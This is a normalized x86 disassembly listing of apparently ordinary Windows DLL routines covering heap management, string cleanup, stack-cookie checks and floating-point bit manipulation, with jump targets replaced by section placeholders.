or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x20
sub_10008715
mov edi edi
push ebp
mov ebp esp
push 0x8
call sub_1002e3ac
pop ecx
test eax eax
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov [ rw-data ] eax
pop ebp
retn
sub_10008740
mov eax [ esi + 0x24 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x34 ]
cmp eax ebx
je r-xdata
cmp [ esi ] 0x1
jne r-xdata
mov [ esi + 0x34 ] ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
cmp [ esi + 0x1c ] 0x10
jb r-xdata
push eax
call sub_1000a86e
add esp 0x4
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x1c ] 0xf
mov [ esi + 0x18 ] ebx
push esi
mov [ esi + 0x8 ] bl
call sub_1000a86e
add esp 0x4
mov eax esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
call sub_1000a86e
add esp 0x4
sub_100087ba
push 0xe0
mov eax sub_1008598b
call sub_10047689
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xa4 ] eax
movzx eax [ ebp + 0x1c ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x94 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x14 ] bl
je r-xdata
lea eax [ ebp - 0xac ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100294ad
pop ecx
mov edi eax
mov [ ebp - 0x88 ] eax
lea ecx [ ebp - 0xac ]
lea eax [ ebp - 0xa8 ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100054b4
mov edi eax
pop ecx
mov [ ebp - 0x88 ] edi
lea ecx [ ebp - 0xa8 ]
jmp r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
sub eax [ ebp + 0x34 ]
push esi
inc eax
push eax
push ebx
lea ecx [ ebp + 0x24 ]
call sub_1004a101
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
call sub_1002be90
add esi 0x8
push esi
push ebx
push 0x30
call sub_10030ff0
movzx esi ax
add esp 0xc
lea eax [ ebp - 0x48 ]
push eax
mov ecx edi
mov [ ebp - 0x98 ] esi
call sub_10026407
mov eax [ edi ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call [ eax + 0x1c ]
cdq
xor eax edx
sub eax edx
mov [ ebp - 0x8c ] eax
cmp [ ebp + 0x34 ] eax
ja r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
and [ ebp - 0x1c ] 0x0
push 0x7
pop edi
xor eax eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] ax
cmp [ ebp + 0x20 ] 0x0
mov esi [ ebp - 0x88 ]
mov eax [ esi ]
lea ecx [ ebp - 0x84 ]
push ecx
mov [ ebp - 0x4 ] 0x4
mov ecx esi
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
call [ eax + 0x20 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_1002f75b
mov [ ebp - 0x4 ] 0x6
call [ eax + 0x24 ]
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x84 ] eax
lea eax [ ebp - 0x80 ]
push eax
mov ecx esi
call sub_1001fc54
mov [ ebp - 0x4 ] 0x5
jmp r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
mov edi [ ebp - 0x8c ]
xor bl bl
xor edx edx
xor ecx ecx
mov ecx [ ebp - 0x88 ]
lea eax [ ebp - 0x80 ]
push eax
call sub_100332a0
push eax
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] 0x8
call sub_10033f90
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] 0x7
call sub_1006d830
push eax
lea ecx [ ebp - 0x2c ]
call sub_10033f90
push 0x0
push 0x1
lea ecx [ ebp - 0x80 ]
call sub_1006d830
and [ ebp - 0x54 ] 0x0
xor eax eax
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x64 ] ax
mov eax [ ebp - 0x90 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x4 ] 0x7
test al 0x8
je r-xdata
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
cmp [ ebp - 0x34 ] 0x10
mov edi [ ebp - 0x48 ]
movzx ebx ax
jae r-xdata
inc edx
sub eax 0x4
je r-xdata
mov esi [ ebp + 0x34 ]
sub esi [ ebp - 0x8c ]
jmp r-xdata
lea edi [ ebp - 0x48 ]
inc ecx
cmp ecx 0x4
jb r-xdata
mov bl 0x1
add edx [ ebp - 0x54 ]
jmp r-xdata
sub eax 0x7
je r-xdata
mov al [ edi ]
cmp al 0x7f
jne r-xdata
movsx eax [ ebp + ecx - 0x84 ]
sub eax 0x20
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp [ ecx + 0x24 ] 0x0
mov eax [ ecx + 0x20 ]
jl r-xdata
add edx [ ebp - 0x1c ]
jmp r-xdata
sub eax 0x4b
je r-xdata
test al al
jle r-xdata
xor esi esi
jg r-xdata
cmp [ ebp + 0x34 ] edi
ja r-xdata
dec eax
dec eax
je r-xdata
movsx eax al
cmp eax esi
jae r-xdata
xor ebx ebx
cmp eax 0x100
jne r-xdata
cmp eax edx
jbe r-xdata
test eax eax
je r-xdata
xor eax eax
mov eax edi
sub eax [ ebp + 0x34 ]
inc eax
jmp r-xdata
cmp ecx 0x3
je r-xdata
jmp r-xdata
push ebx
sub esi eax
push 0x1
push esi
lea ecx [ ebp + 0x24 ]
call sub_1004a101
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
push [ ebp - 0x94 ]
mov [ ebp - 0xa0 ] eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x9c ] eax
call sub_100176b0
mov eax [ ebp - 0xa0 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x9c ]
mov [ ebp + 0x10 ] eax
sub eax 0x4
je r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xa0 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001a233
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
xor esi esi
test bl bl
jne r-xdata
sub eax edx
mov esi eax
jmp r-xdata
xor esi esi
cmp esi edi
sbb esi esi
neg esi
add esi [ ebp + 0x34 ]
add esi eax
add edx esi
jmp r-xdata
mov edi eax
inc ebx
cmp ebx 0x4
jb r-xdata
push esi
push [ ebp - 0x94 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001a233
add esp 0x14
xor esi esi
cmp [ ebp - 0x50 ] 0x8
mov eax [ ebp - 0x64 ]
jae r-xdata
sub eax 0x7
je r-xdata
mov eax ecx
mov eax [ eax + 0x14 ]
and eax 0x1c0
mov [ ebp - 0x8c ] eax
cmp eax 0x40
je r-xdata
movsx eax [ ebp + ebx - 0x84 ]
sub eax 0x20
je r-xdata
cmp [ ebp - 0x1c ] 0x1
jbe r-xdata
push [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0xe4 ]
jmp r-xdata
lea eax [ ebp - 0x64 ]
cmp [ ebp - 0x1c ] 0x0
jbe r-xdata
sub eax 0x4b
je r-xdata
mov eax [ ebp - 0x90 ]
push esi
push [ ebp - 0x94 ]
xor edi edi
push [ ebp + 0x10 ]
mov [ eax + 0x20 ] edi
push [ ebp + 0xc ]
mov [ eax + 0x24 ] edi
push [ ebp - 0xa4 ]
call sub_1001a233
add esp 0x14
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x64 ]
call sub_1006d830
push edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_1006d830
push edi
push esi
lea ecx [ ebp - 0x48 ]
call sub_10005b50
push edi
push esi
lea ecx [ ebp + 0x24 ]
call sub_1006d830
mov eax [ ebp - 0xa4 ]
call sub_100262c3
retn 0x38
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
test edi edi
jne r-xdata
dec eax
dec eax
je r-xdata
mov ecx [ ebp - 0x1c ]
add eax 0x2
dec ecx
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xb4 ]
push [ ebp + 0xc ]
push eax
call sub_1006d528
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x14
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x2c ]
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x10 ] eax
push 0x1
push eax
lea eax [ ebp - 0xec ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
cmp [ ebp + 0x34 ] edi
ja r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
cmp [ ebp - 0x8c ] 0x100
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
push [ ebp - 0x98 ]
lea ecx [ ebp + 0xc ]
call sub_100176b0
mov ecx [ ebp - 0x88 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_100176b0
mov eax edi
sub eax [ ebp + 0x34 ]
push eax
push [ ebp - 0x98 ]
lea eax [ ebp - 0xd4 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001a233
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x14
cmp [ ebp + 0x38 ] 0x8
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp + 0x24 ]
jae r-xdata
push [ ebp + 0x34 ]
push eax
lea eax [ ebp - 0xbc ]
lea eax [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
push ecx
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0xcc ]
push [ ebp + 0xc ]
push eax
call sub_1006d528
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x88 ]
mov [ ebp + 0x10 ] eax
mov eax [ ecx ]
add esp 0x14
call [ eax + 0x4 ]
movzx eax ax
push eax
lea ecx [ ebp + 0xc ]
call sub_100176b0
cmp [ ebp + 0x38 ] 0x8
mov eax [ ebp + 0x24 ]
jae r-xdata
lea eax [ ebp + 0x24 ]
push [ ebp + 0x34 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0xc4 ]
jmp r-xdata
lea ecx [ ebp + 0x24 ]
mov ecx [ ebp + 0x34 ]
sub ecx edi
lea eax [ eax + ecx * 2 ]
push edi
push eax
lea eax [ ebp - 0xdc ]
jmp r-xdata
lea eax [ ebp + 0x24 ]
push eax
call sub_1006d528
add esp 0x14
jmp r-xdata
sub_10008d50
push ebp
mov ebp esp
push 0xffffffff
push sub_1008a194
mov eax [ fs : 0x0 ]
push eax
sub esp 0x49c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov esi edx
mov [ ebp - 0x4a4 ] eax
mov eax [ esi + 0x10 ]
lea edx [ eax + eax ]
push edx
push 0x8
mov [ ebp - 0x4a8 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
cmp [ esi + 0x14 ] 0x8
mov ecx [ esi + 0x10 ]
jb r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0xa8 ]
call sub_10034100
mov [ ebp - 0x8c ] edi
mov [ ebp - 0x88 ] esi
lea ecx [ ebp - 0xa8 ]
mov edi ebx
mov [ ebp - 0x4 ] 0x0
call sub_1006dc90
lea esi [ ebp - 0x4a0 ]
call sub_10070090
push ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_100381b0
mov esi eax
xor ebx ebx
cmp esi ebx
je r-xdata
add ecx ecx
push ecx
push eax
push edi
call sub_1007f580
mov esi [ esi + 0x10 ]
add esp 0xc
lea edx [ ebp - 0x24 ]
mov eax 0x5f
add esi esi
call sub_10069020
xor edx edx
lea eax [ ebp - 0x24 ]
mov [ ebp - 0xa8 ] dx
mov [ ebp - 0x94 ] 0x7
mov [ ebp - 0x98 ] 0x0
lea edx [ eax + 0x2 ]
mov edx [ ebp - 0x49c ]
mov ecx [ ebp - 0x4a4 ]
mov eax [ ebp - 0x498 ]
mov edi [ ebp - 0x4a8 ]
mov [ ecx ] edx
mov [ edi ] eax
call sub_10031c90
mov esi eax
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x15c
call sub_10069020
lea ecx [ ebp - 0xc4 ]
push esi
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x64 ]
lea esi [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x2
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ ebx + 0x10 ]
mov [ ebp - 0x4 ] 0x3
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x70 ] esi
jb r-xdata
lea ecx [ ebp - 0x4a0 ]
push ecx
mov [ ebp - 0x4 ] bl
call sub_100390c0
cmp [ ebp - 0x94 ] 0x8
jb r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0xb0
call sub_10069020
lea ecx [ ebp - 0xc4 ]
push esi
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x68 ]
lea esi [ ebp - 0x84 ]
mov [ ebp - 0x4 ] 0x4
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x10
mov [ ebp - 0x4 ] 0x5
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x70 ] esi
jb r-xdata
xor eax eax
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] ax
cmp [ ebp - 0xb0 ] esi
jb r-xdata
mov edx [ ebp - 0x84 ]
push edx
call sub_1000a86e
add esp 0x4
xor eax eax
mov edx [ ebp - 0xa8 ]
push edx
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] ax
cmp [ ebp - 0xb0 ] esi
jb r-xdata
mov edx [ ebp - 0x84 ]
push edx
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x4a0 ]
push edx
mov [ ebp - 0x4 ] 0x0
call sub_100390c0
cmp [ ebp - 0x94 ] esi
jb r-xdata
mov ecx [ ebp - 0xc4 ]
push ecx
call sub_1000a86e
add esp 0x4
lea edx [ ebp - 0x4a0 ]
push edx
mov [ ebp - 0x4 ] 0x0
call sub_100390c0
cmp [ ebp - 0x94 ] esi
jb r-xdata
mov ecx [ ebp - 0xc4 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0xa8 ]
push eax
call sub_1000a86e
add esp 0x4
mov eax 0x3
jmp r-xdata
mov eax [ ebp - 0xa8 ]
push eax
call sub_1000a86e
add esp 0x4
sub_10009040
push ebp
mov ebp esp
push ebx
mov ebx 0x1
test [ rw-data ] bl
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
or [ rw-data ] ebx
push sub_1008ad10
call sub_10064546
add esp 0x4
call sub_1004f7b0
test eax eax
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx eax
call sub_1001cc80
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
xor eax eax
pop ebx
pop ebp
retn
mov [ rw-data ] ebx
mov eax 0x2
pop ebx
pop ebp
retn
sub_1000909e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x1
je r-xdata
call sub_1005b670
mov [ eax ] 0x21
jle r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x3
jg r-xdata
call sub_1005b670
mov [ eax ] 0x22
pop ebp
retn
sub_100090d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x34 ] ecx
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x38 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp - 0x24 ] 0x0
push esi
lea esi [ ebp - 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ rw-data ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ edi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea esi [ ebp + eax * 4 - 0x10 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x30 ] ecx
test [ esi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x30 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi ] eax
mov eax [ ebp - 0x28 ]
inc eax
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x28 ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x38 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x10 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x10 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
mov ecx [ ebp - 0x34 ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x24 ] 0x0
sub ecx edi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edi [ ecx ]
add edi edx
mov [ ebp - 0x20 ] edi
mov edi [ ecx ]
cmp [ ebp - 0x20 ] edi
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
mov ecx [ rw-data ]
cmp ebx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x2c ]
lea esi [ ebp - 0x1c ]
mov ecx eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x24 ] 0x1
cmp [ ebp - 0x20 ] edx
jmp r-xdata
add ebx [ rw-data ]
and [ ebp - 0x10 ] 0x7fffffff
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x10 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] ecx
jae r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x24 ] 0x0
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea edi [ edx + 0x1 ]
mov [ ebp - 0x20 ] edi
cmp edi edx
jb r-xdata
dec eax
mov edx [ ebp - 0x20 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x24 ]
jns r-xdata
mov ecx [ ebp - 0x20 ]
mov edi [ ebp + ecx * 4 - 0x10 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp - 0x20 ]
or edi [ ebp - 0x28 ]
mov [ ebp + ecx * 4 - 0x10 ] edi
mov edi [ ebp - 0x2c ]
mov ecx [ ebp - 0x24 ]
shl edi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edi 0x1
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea eax [ esi + 0x1 ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
lea edx [ esi + 0x1 ]
and edx 0x8000001f
mov [ ebp - 0x30 ] eax
jns r-xdata
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
xor eax eax
sub ecx 0x4
dec edx
jns r-xdata
cmp edx eax
jl r-xdata
mov ebx [ rw-data ]
add ebx [ rw-data ]
xor eax eax
inc eax
jmp r-xdata
sub ecx 0x4
dec edx
jns r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x10 ]
mov [ ebp - 0x2c ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x2c ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0x30 ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x10 ] edx
jmp r-xdata
mov ecx [ rw-data ]
lea eax [ ecx + 0x1 ]
cdq
and edx 0x1f
add eax edx
lea edx [ ecx + 0x1 ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x10 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0x28 ] 0x0
and [ ebp - 0x20 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x24 ] 0x20
sub [ ebp - 0x24 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp - 0x20 ]
lea ebx [ ebp + ebx * 4 - 0x10 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x2c ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x24 ]
or esi [ ebp - 0x28 ]
mov [ ebx ] esi
mov esi [ ebp - 0x2c ]
shl esi cl
inc [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] 0x3
mov [ ebp - 0x28 ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x8 ]
pop edx
sub ecx esi
and [ ebp - 0x28 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x10 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x10 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x10 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x28 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
sub ecx 0x4
dec edx
jns r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp - 0x28 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x10 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_10009630
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
mov esi ecx
call sub_10015c68
mov [ esi ] r--data
mov eax [ edi + 0xc ]
mov [ esi + 0xc ] eax
mov ecx [ edi + 0x10 ]
pop edi
